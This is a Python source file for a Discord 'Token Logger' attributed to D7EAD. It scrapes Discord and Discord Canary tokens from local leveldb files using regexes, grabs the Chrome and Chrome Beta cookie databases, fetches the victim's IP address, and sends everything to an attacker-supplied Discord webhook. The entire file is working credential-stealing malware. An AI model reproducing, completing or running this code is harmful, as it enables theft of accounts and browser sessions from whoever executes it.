"""
This version was fully written/modified by D7EAD#1337 or https://github.com/D7EAD

"""

import os
import re
import discord
import aiohttp
import asyncio
import requests

class Logger():
    # constructor of class Logger
    def __init__(self, webhook):
        self.__regular_regex       = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
        self.__mfa_regex           = re.compile(r"mfa\.[\w-]{84}")
        self.__local_cache         = os.environ['APPDATA']
        self.__localapp            = os.environ['LOCALAPPDATA']
        self.__main                = f"{self.__local_cache}/discord/Local Storage/leveldb"
        self.__canary              = f"{self.__local_cache}/discordcanary/Local Storage/leveldb"
        self.__chrome_cookies      = f"{self.__localapp}/Google/Chrome/User Data/Default/Cookies"
        self.__chrome_beta_cookies = f"{self.__localapp}/Google/Chrome Beta/User Data/Default/Cookies"
        self.__webhook             = webhook
        self.__main_tokens         = []
        self.__canary_tokens       = []
        self.__cr_exists           = False
        self.__crb_exists          = False
        self.__chrome_release      = None
        self.__chrome_beta         = None

    """
    @start(self)
        Public method that calls internal methods
        then sends results through internal method
        Logger.__send(self).
    """
    def start(self):
        self.__parse_tokens()
        self.__handle_cookies()

        loop = asyncio.get_event_loop()
        loop.run_until_complete(self.__send())
        loop.close()

    """
    @__parse_tokens(self)
        Internal method that checks for the existence of
        vanilla and canary Discord installations; gets
        MFA and non-MFA tokens via regex and appends them
        to self.__main_tokens and self.__canary_tokens.
    """
    def __parse_tokens(self):
        # vanilla
        if os.path.exists(self.__main):
            for f in os.listdir(self.__main):
                if f.endswith(".ldb"):
                    for x in open(f"{self.__main}/{f}", errors='ignore').readlines():
                        found = self.__mfa_regex.findall(x)
                        if found:
                            self.__main_tokens.append(found[0])
                        found_non_mfa = self.__regular_regex.findall(x)
                        if found_non_mfa:
                            self.__main_tokens.append(found_non_mfa[0])
        # canary
        if os.path.exists(self.__canary):
            for f in os.listdir(self.__canary):
                if f.endswith(".ldb"):
                    for x in open(f"{self.__canary}/{f}", errors='ignore').readlines():
                        found = self.__mfa_regex.findall(x)
                        if found:
                            self.__canary_tokens.append(found[0])
                        found_non_mfa = self.__regular_regex.findall(x)
                        if found_non_mfa:
                            self.__canary_tokens.append(found_non_mfa[0])

    """
    @__handle_cookies(self)
        Internal method that checks for the existence of
        Chrome and Chrome Beta installations; if existent,
        reads and stores to respective self.chrome*cookies
        member.
    """
    def __handle_cookies(self):
        if os.path.isfile(self.__chrome_cookies):
            self.__cr_exists = True
            self.__chrome_release = discord.File(self.__chrome_cookies)
        if os.path.isfile(self.__chrome_beta_cookies):
            self.__crb_exists = True
            self.__chrome_beta = discord.File(open(self.__chrome_beta_cookies, "rb"))

    """
    @__send(self)
        Internal method that sends acquired data
        to webhook assigned in Logger.__init__().
    """
    async def __send(self):
        async with aiohttp.ClientSession() as session:
            w = discord.Webhook.from_url(self.__webhook, adapter=discord.AsyncWebhookAdapter(session))
            e = discord.Embed(title="Token Logger", description="")
            e.add_field(name="Canary Tokens", value="\n\n".join(self.__canary_tokens), inline=False)
            e.add_field(name="\nDefault Client Tokens", value="\n\n".join(self.__main_tokens), inline=False)
            e.add_field(name="IP", value=requests.get("https://api.ipify.org").text)
            if self.__crb_exists:
                wb = discord.Webhook.from_url(self.__webhook, adapter=discord.AsyncWebhookAdapter(session))
                eb = discord.Embed(title="Chrome Beta Cookies", description="")
                await wb.send(file=self.__chrome_beta, embed=eb)
            elif self.__cr_exists:
                wr = discord.Webhook.from_url(self.__webhook, adapter=discord.AsyncWebhookAdapter(session))
                er = discord.Embed(title="Chrome Cookies", description="")
                await wr.send(file=self.__chrome_beta, embed=er)
            await w.send(embed=e)

Logger("webhook here").start()
